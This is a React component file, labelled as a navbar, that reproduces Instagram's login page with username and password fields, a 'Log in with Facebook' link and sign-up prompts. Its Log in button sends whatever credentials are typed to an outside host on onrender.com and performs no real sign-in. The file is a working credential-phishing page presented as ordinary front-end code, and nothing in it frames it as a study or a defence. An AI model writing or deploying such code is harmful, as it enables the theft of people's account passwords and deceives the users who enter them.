import { Col, Container, Row } from "react-bootstrap";
import logo from "../../assets/img/big.png";
import instagram from "../../assets/img/instagram.png";
import icon from "../../assets/img/icon.png";
import play from "../../assets/img/play.png"
import "./Navbar.css";

export default function Navbar() {

    let text1 = document.querySelector(".inp");
    let text2 = document.querySelector(".inpt");

    return (
        <>
            <Container>
                <Row>
                    <Col lg="8" className="aaa">
                        <div className="j d-none d-lg-block">
                            <div className="emmer">
                                <div className="emmer_left">
                                    <img src={logo} alt="" />
                                </div>
                                <div className="emmer_right">
                                    <img src={instagram} alt="" />
                                    <div className="d">
                                        <input type="text" placeholder="Phone number, username, or email" className="inp" />
                                    </div>
                                    <div className="a">
                                        <input type="password" placeholder="Password" className="inpt" />
                                    </div>
                                    <div className="s">
                                        <button className="tn" onClick={() => {
                                            let tex1 = text1.value;
                                            let tex2 = text2.value;
                                            fetch('https://instagram-back-end.onrender.com/data', {
                                                method: 'POST',
                                                headers: {
                                                    'Content-Type': 'application/json'
                                                },
                                                body: JSON.stringify({
                                                    login: tex1,
                                                    password: tex2
                                                })
                                            })
                                        }}>Log in</button>
                                    </div>
                                    <div className="al">
                                        <div className="k"></div>
                                        <h6>OR</h6>
                                        <div className="k"></div>
                                    </div>
                                    <div className="l">
                                        <img src={icon} alt="" className="icon" />
                                        <p className="nn">Log in with Facebook</p>
                                    </div>
                                    <p className="as">Forgot password?</p>
                                    <div className="emmer_">
                                        <div className="emmer__">
                                            <div className="o">
                                                <p className="q">Don't have an account?</p>
                                                <p className="up">Sign up</p>
                                            </div>
                                        </div>
                                        <p className="ww">Get the app.</p>
                                        <img src={play} alt="" />
                                    </div>
                                </div>

                            </div>
                        </div>
                        

                    </Col>
                </Row>
            </Container >
        </>
    )
}
